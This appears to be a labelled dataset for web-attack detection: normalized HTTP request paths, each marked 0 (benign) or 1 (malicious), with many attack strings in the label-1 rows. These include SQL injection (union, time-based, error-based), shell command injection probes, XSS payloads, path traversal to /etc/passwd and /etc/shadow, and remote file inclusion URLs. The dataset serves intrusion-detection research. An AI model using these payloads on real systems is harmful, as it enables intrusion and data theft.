request	label
/ 164620 / 	0
/ string / strings / parameters = plaza pont 47 ,  6 ? e 	0
/ 50994198 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  and 4967 = 8866 and  (  (  (  ""  "" jzyn ""  ""  like  ""  "" jzyn "	1
/ 2559699 / 	0
/ string / modo = registro & login = whited & password = coyotera & nombre = noaldo & apellidos = tranwincky + selman & email = griem @ blogertico . nz & dnia = 28828668p & direccion = zenobia ,  + 197 + 8g & ciudad = cabra + del + camp & cp = 15350 & provincia = valencia & ntc = 3322562441567993 & b1 = registrar 	1
/ help . php ? q = ver ;  > q25171792 & rem ; 	1
/ string / strings / parameters = '  | echo $ ifshyumcy $  (  ( 48 + 63 )  )  $  ( echo $ ifshyumcy ) hyumcy & 	1
/ string / modo = entrar & login = goth & pwd = ensaa6o & remember = off & b1 = entrar 	0
"/ string / strings / parameters = ; echo yrbnty $  (  ( 83 + 14 )  )  $  ( echo yrbnty ) yrbnty "" "	1
/ string / strings / parameters = -8933 )  as iiyr where 1974 = 1974 union all select 1974 , 1974 , 1974 , 1974 , 1974 # 	1
/ string / strings / parameters = nien-hwa 	0
/ string / strings / parameters = 13591 	0
/ scriptpath / footers . php ? tinybb_footers = http :  /  / 192 . 168 . 202 . 96 : 8080 / vir0v3xfc ? 	1
/ news / scripts / news_page . php ? script_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ?  ? 	1
/ string / strings / parameters = |  | echo rzqoue $  (  ( 1 + 0 )  )  $  ( echo rzqoue ) rzqoue & 	1
/ string / strings / parameters = 27c01a 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as uqkn where 4642 = 4642 or elt ( 6272 = 6272 , sleep ( 5 )  )  -- "	1
/  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  { file } 	1
/ string / strings / parameters = '  |   [  4 -ne  $  ( echo iqybmk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ smsmanager / 	0
"/ string / strings / parameters = 1 ""  ""  where 7245 = 7245 and 9198 = 9198 -- "	1
/ reghelp / 	0
/ string / strings / parameters = echo kymbvz $  (  ( 7 + 62 )  )  $  ( echo kymbvz ) kymbvz /  / 	1
/ des-dar2_25 / 	0
/ string / modoa = entrar & login = viswa & pwd = 0sc9d25 . 2 & remember = off & b1 = entrar 	1
/ en-us / account / core / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ napatractortrailertoy / 	0
/ string / strings / parameters = 3117 	0
/ string / strings / parameters = gaspard-birgel @ indorec . kr 	0
/ forum_viewed / 	0
/ string / strings / parameters = |   [  1 -ne  $  ( echo fpmdol  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  # 	1
/ javascript / callout . exe 	1
/ pack_geolistemini / 	0
/ string / strings / parameters = 17590r 	0
"/  "" mary cheney ""  / "	1
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testiabz = 5220 ""  > "	1
/ watch_online / 	0
/ bn857frh . php ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 1 '  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  ' ejnt '  like  ' ejnt 	1
/ history_trivia / 	0
"/ 3j8echh0 . kspx ?  < script > document . cookie =  "" testfuqi = 4189 ;  ""  <  / script > "	1
/ string / strings / parameters = 2563 	0
/ javascript / velocity . jsf 	0
/ d04505t / 	0
/ string / modo = insertar & precio = 6963 & b1 = pasar + por + caja 	0
/ string / strings / parameters = 1 '  )  as vmmk where 5757 = 5757 or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
/ childagen / 	0
/ javascript / footer . ini 	0
/ string / id = 3 & nombre = queso + manchego & precio = 85 /  & cantidad = 21 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = caada del hoyo 	0
/ irononpatchesdolphin / 	0
/ valtech / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  and 8316 = 6410 # "	1
/ klein-iraq / 	0
/ cixi_gifts / 	0
/ string / strings / parameters = enseriarse 	0
/ string / strings / parameters = 1 %  '  and elt ( 7619 = 1489 , 1489 )  and  '  %  '  =  ' 	1
/ library / translation . inc . php ? globals [ srcdir ]  = xxpathxx ? 	1
/ string / strings / parameters = 1 ,  ( case when 6620 = 3092 then 1 else null end ) 	1
"/ string / strings / parameters = < animation xlink : href =  "" javascript : alert ( 88 )  ""  /  > "	1
/ string / strings / parameters = 07559284n 	0
/ string / strings / parameters = 5533110121299997 	0
/ string / strings / parameters = < body oninput = alert ( 1 )  >  < input autofocus > 	1
/ 711734 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  and  ( 7467 = 7962 )  * 7962 and  (  (  ""  "" nhld ""  ""  =  ""  "" nhld "	1
/ string / strings / parameters = , null , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   -- 	1
/ string / modo = registro & login = schreife & password = estornin3 & nombre = delsa & apellidos = gallejon + mingo & email = murton @ estirpe-heroes . id & dni = 85766213h & direccion = c /  + cabo + lopez + martinez + s / n ,  + 7 ? c & ciudad = tobarra & cp = 34116 & provincia = huesca & ntc = 8331341352065092 & b1 = registrar 	0
/ page . png 	0
/ newsarchive . php ? path_to_script = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  ?  & cmd = ls 	1
/ avload / 	0
/ 000022645 / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo vdsmtk )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
"/ top . php ? stuff =  ""  & rm \ x0cq43992942 & rem \ x0c "	1
/ syllabus / 	0
/ a1monitor 6 / 	0
/ cgi-bin / index . php ? src = 1 & _common = 1 & time = 1331904460 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ dance ejay 7 cd1 / 	0
/ counter strike source wallhack / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  (  (  (  ""  "" gfwz ""  ""  =  ""  "" gfwz "	1
"/ string / strings / parameters = '  |   [  9 -ne  $  ( echo ldsbta  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ string / strings / parameters = entregadora 	0
/ javascript / samples . swf 	0
/ prorat / 	0
/ 152661 / 	0
/ upgrade_right / 	0
/ iaxsetup . 401 . exe / 	1
/ top . php ? stuff =  '  \ x0adel q53951968  # 	1
/ power_ps3q02-arrian / 	0
/ internet-sites / 	0
/ string / strings / parameters = ; echo efmvrm $  (  ( 22 + 51 )  )  $  ( echo efmvrm ) efmvrm 	1
/ 1995_99 / 	0
/ google0512 / 	0
/ filesharing61 / 	0
/ string / strings / parameters = 3893864101962581 	0
"/ phpmyadmin / documentation . html ? phpmyadmin =  \ xf0 '  '  \ xf0 ""  "" "	1
"/ main . php ? stuff =  ""  \ x0duname \ x09 > q16681283 \ x09 # "	1
/ help . php ? q =  '  ; del q14794373  # 	1
/ examples / jsp / cal / download . php ? language =  / etc / passwd \ x00 	1
/ view_1252 / 	0
/ 165731 / 	0
/ post . asp ? method = topic & forum_id = 1 & cat_id = 1 & type = wvs-xss-magic-string-410025568136 	1
/ link-9 / 	0
/ string / modo = registro & login = horak & password = 6esi74oso & nombre = blas & apellidos = gasca + noria & email = dearden @ hipermadrid . ga & dni = 01101234v & direccion = avenida + comunidad + de + madrid + 45 ,  + 13c & ciudad = villarreal + de + huerva '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & cp = 01170 & provincia = girona & ntc = 1336518549569700 & b1 = registrar 	1
/ 137286 / 	0
/ javascript / toc . 7z 	0
/ string / strings / parameters = 3483759032039074 	0
/ javascript / do . db 	0
"/ string / strings / parameters = ""  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null )   /  * "	1
/ charts_x / 	0
/ 120715a / 	0
/ string / strings / parameters = 7548017062827268 	0
"/ 6qbynt4f . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = 1 ""  ""  )  )  as wooq where 7671 = 7671 and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  -- "	1
/ string / strings / parameters = sagarda 	0
/ string / strings / parameters = 9161686921830219 	0
/ 159984 / 	0
/ string / strings / parameters = relatadora 	0
/ javascript / webb . sfish 	0
/ string / strings / parameters = talia 	0
/ the-raiders / 	0
/ string / strings / parameters = argerich tries 	0
/ examples / jsp / sessions / webdist . cgi ? distloc =  ; id 	1
/ string / strings / parameters = | echo $ ifsmcddqx $  (  ( 44 + 84 )  )  $  ( echo $ ifsmcddqx ) mcddqx | 	1
/ javascript / pos . meta 	0
/ string / strings / parameters = 1 '  +  ( select  ' ohdf '  where 7878 = 7878 and 5678 = 3277 -- 	1
/ pay_index / 	0
/ string / modo = entrar & login = hazell & pwd = postema & remember = off & b1 = entrar 	0
/ landamerica / 	0
/ ar2007010401524 / 	0
/ gherman / 	0
/ string / strings / parameters = calle sol s / 	0
/ string / strings / parameters = ; echo $ ifsdyvmjq $  (  ( 81 + 59 )  )  $  ( echo $ ifsdyvmjq ) dyvmjq 	1
/ javascript / fn . mdb 	0
"/ string / id = 1paros ""  + style =  "" background : url ( javascript : alert (  ' paros '  )  )  & id = 2 "	1
/ 0596002246 / 	0
"/ esmozg5d . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = 1 ""  ""  )  or extractvalue ( 1297 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 1297 = 1297 , 1 )  )  )  , 0x717a767a71 )  )  and  (  ""  "" cdnc ""  ""  like  ""  "" cdnc "	1
/ script / ident / identification . php ? path_inc = xxpathxx 	1
/ mjapan / 	0
/ string / strings / parameters = avenida canto ropero 5 	0
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo ytdcvx )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ string / strings / parameters = brandt 	0
/ poll / view . php ? int_path = xxpathxx 	1
/ string / strings / parameters = ( 1589 = 1589 )  * 1 	1
/ string / strings / parameters = ersch 	0
/ javascript / government . tgz 	0
/ 93218141 / 	0
/ cgi-bin / webspirs . cgi ? sp . nextform =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = desolladamen-te 	0
/ string / strings / parameters = &  & echo $ ifsbmuaxq $  (  ( 31 + 95 )  )  $  ( echo $ ifsbmuaxq ) bmuaxq /  / 	1
/ en-us / account / evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331905213 , 113095511  -- 	1
/ underemployed / 	0
/ c :  \ system32 \ cmd . exe 	1
/ sagetvclient 2 / 	0
/ string / modo = registro & login = raddie & password = ot5ora & nombre = celsa & apellidos = campi + delgados & email = gorin . mccracken @ evelin . am & dni = 22167302v & direccion = c /  + postigos + de + amaro + s / n ,  +  & ciudad = santa + cruz + de + marchena & cp = 09191 & provincia = madrid & ntc = 1391785599222987 & b1 = registrar 	0
/ help . php ? q =  \ x0duname \ x09 > q91242654 \ x09 # 	1
/ c380t71ll2jtbsxyxt / 	0
/ javascript / moved . bz2 	0
/ 3526681 / 	0
/ bn857frh . pl ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ qhvu0pdg . php ?  < script > document . cookie =  "" testchuc = 2100 ;  ""  <  / script > "	1
/ string / strings / parameters = &  echo tibiec $  (  ( 4 + 66 )  )  $  ( echo tibiec ) tibiec 	1
/ string / strings / parameters = a2b66r5z 	0
/ string / strings / parameters = 1 < script  > prompt ( 962477 )  <  / script > 	1
/ string / strings / parameters = portugal 8 	0
/ anonymous-email / 	0
/ string / strings / parameters = 64 	0
/ cialis-reviews / 	0
/ eu_login / 	0
/ string / strings / parameters = radresa tudn 	0
/ deco8_100 / 	0
/ g00ns3 / 	0
"/ 7u1pb2xi . asp ?  < meta http-equiv = set-cookie content =  "" testlwwz = 718 ""  > "	1
/ javascript / embedded . exe 	1
/ script / ident / loginliste . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	1
/ string / strings / parameters = -9809 '  order by 1 -- 	1
/ string / modo = insertar & precio = 7884 & b1 = confirmar / 	1
/ string / strings / parameters = sayara 	0
/ string / strings / parameters = siguemepol0o 	0
/ agpgraphicscard / 	0
/ atmtheft / 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo baqata )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ "	1
/ string / modo = entrar & login = renem / a & pwd = vl70am4390 & remember = on & b1 = entrar 	1
"/ rv98iwjp . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ anthony j / 	0
/ t15445 / 	0
/ string / strings / parameters = '  &  & echo $ ifsfyriye $  (  ( 49 + 44 )  )  $  ( echo $ ifsfyriye ) fyriye | 	1
/ examples / jsp / cal / lib / authform . inc . php ? path_pre =  / etc / passwd \ x00 	1
/ string / modo = insertar & precio = 6622 & b1 = confirmar 	0
/ examples / jsp / security / protected / j_security_check ; jsessionid = 5680ad1b9956cf0a8a9f08a20f983ee6116917755 . old 	1
/ string / id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 19 & b1 = aadir + al + carrito 	0
/ icon_comics / 	0
/ string / strings / parameters = calle somontin 154 ,  3a 	0
/ string / strings / parameters = f3ac76025 	0
/ string / strings / parameters = '   str =  $  ( echo kqszpy )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  # 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo zyxrff )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ toy-storage / 	0
/ 352202001 / 	0
/ string / strings / parameters = echo llpoao $  (  ( 93 + 93 )  )  $  ( echo llpoao ) llpoao 	1
/ string / strings / parameters = eberto 	0
/ string / strings / parameters = 1 %  '  )  )  ; iif ( 5257 = 5257 , 1 , 1 / 0 ) 	1
/ string / modo = registro & login = myong & password = colorismo & nombre = dagmar & apellidos = cabane + molas & email = holton @ enigmatico . vu & dni = 91624095f & direccion = don + ferreol + hernandez + s / n ,  +  & ciudad = calders & cp = 37183 & provincia = salamancaany ?   set-cookie :  + tamper = 1041264011025374727 & ntc = 6035116303925311 & b1 = registrar 	1
/ string / id = 2 & nombre = vino + rioja & precio =  '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & cantidad = 18 & b1 = aadir + al + carrito 	1
"/ top . php ? stuff =  ""  & ping \ xa0-w \ xa011000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 & rem \ xa0 "	1
/ string / modo =  '  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & precio = 88 & b1 = confirmar 	1
/ string / strings / parameters = 8485 	0
/ string / modo = registro & login = squires & password = 234o3o & nombre = delva & apellidos = junyent & email = barrault @ custombikesclothes . np & dni = 07698521f & direccion = carretera + curva + de + gracia + 198 ,  +  & ciudad = olmed / illa + de + alarc / n & cp = 35420 & provincia = valladolid & ntc = 2110433073963447 & b1 = registrar 	1
/ string / strings / parameters = 1 )  or  ( select  *  from  ( select ( sleep ( 5 )  )  ) sddo )  # 	1
/ string / strings / parameters = antoliano 	0
/ string / strings / parameters = ; echo 111111 	1
/ string / strings / parameters = |   [  9 -ne  $  ( echo jnnrop  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ examples / jsp / jsp2 / jspx / admin / connect . inc 	0
/  .  .  % u2215 .  .  % u2215 .  .  % u2215 .  .  % u2215 { file } 	1
/ ovcgi / toolbar . exe 	1
/ etcetera / 	0
/ b00005afi2 / 	0
/ 6466815 / 	0
/ string / id = 3 +  & nombre = jamn + ibrico & precio = 85 & cantidad = 95 & b1 = aadir + al + carrito 	1
/ 6j00o00hpa / 	0
/ javascript / www2 / 	0
/ examples / jsp / cal / squirrelcart / cart_content . php ? cart_isp_root =  / etc / passwd \ x00 	1
/ docs / default-servlet . html 	0
/ logic pro 7 content dvd / 	0
/ msg29647 / 	0
/ hdrtablebtm_divcircles / 	0
/ help . php ? q =  '  & del \ x09q42899831 \ x09 # 	1
/ string / strings / parameters = 5217 	0
"/ main . php ? logout =  ""  ; sleep \ x098 \ x09 # "	1
/ 1394733479 / 	0
/ simulations / 	0
"/ string / strings / parameters = ""  . print (  ` echo xklfap echo  $  (  ( 76 + 43 )  )  echo xklfap echo xklfap `  )  ;  .  ' xklfap "	1
/ kaspersky antihacker / 	0
/ homebrew30_mov09907 / 	0
/ 122457 / 	0
/ string / modo = insertar & precio = 7704 & b1 = pasar + por + caja 	0
"/ oie504mr . kspx ?  < meta http-equiv = set-cookie content =  "" testtpby = 7052 ""  > "	1
/ javascript / bugs . error 	0
/ string / modo = registro & login = kiam & password = mandbula & nombre = clodomiro & apellidos = misut + fondevi & email = gerald @ magritte . bs & dni = 45475660z & direccion = calle + enrique + lopez + garcia + s / n ,  +  & ciudad = karrantza + harana / valle + de + carranza & cp = 18300 & provincia = lava & ntc = 4468134074591535 & b1 = registrar 	0
/ lba-linux / 	0
/ string / strings / parameters = '  + and +  ( select + substr ( group_concat ( pass )  , 1 , 1 )  + from + users )  =  ' a 	1
/ 131776 / 	0
/ e-cpu2v0 / 	0
/ string / strings / parameters = 1 )  as ekgx where 9923 = 9923 or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ string / strings / parameters = glorieta musico emilio alvarez anton 15 	0
/ string / strings / parameters = cabildeo 	0
/ vaughan williams symphony no / 	0
/ string / strings / parameters = .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / shadow	1
"/ en-us / dda2qr7j . x ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ webcgi / cgi-test . exe 	1
/ corporatebasketsbygallant / 	0
/ string / strings / parameters = avenida baraain ,  51 ,  1 ? h 	0
/ examples / jsp / error / docman / new . php 	0
/ string / strings / parameters = 1 where 5929 = 5929 or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  -- 	1
/ javascript / legal . lst 	0
/ 168362 / 	0
/ string / strings / parameters = 23130 	0
/ anara gupta miss jammu indian porn / 	0
